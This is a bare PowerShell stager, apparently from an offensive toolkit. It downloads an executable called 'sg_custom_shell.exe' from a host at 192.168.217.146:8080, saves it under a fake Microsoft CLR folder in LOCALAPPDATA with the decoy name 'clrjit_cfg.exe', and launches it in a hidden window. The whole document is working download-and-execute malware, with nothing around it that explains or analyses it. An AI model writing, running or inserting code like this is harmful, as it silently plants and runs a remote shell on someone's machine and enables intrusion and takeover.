$p=Join-Path $env:LOCALAPPDATA 'Microsoft\CLR_v4.0';
if(!(Test-Path $p)){New-Item -ItemType Directory -Path $p -Force|Out-Null}
$t=Join-Path $p 'clrjit_cfg.exe';
$r=[System.Net.HttpWebRequest]::Create('http://192.168.217.146:8080/output/sg_custom_shell.exe');
$e=$r.GetResponse();
$m=New-Object System.IO.MemoryStream;
$e.GetResponseStream().CopyTo($m);
[System.IO.File]::WriteAllBytes($t,$m.ToArray());
$e.Close();
$n=New-Object System.Diagnostics.ProcessStartInfo;
$n.FileName=$t;
$n.WindowStyle='Hidden';
[System.Diagnostics.Process]::Start($n)|Out-Null;
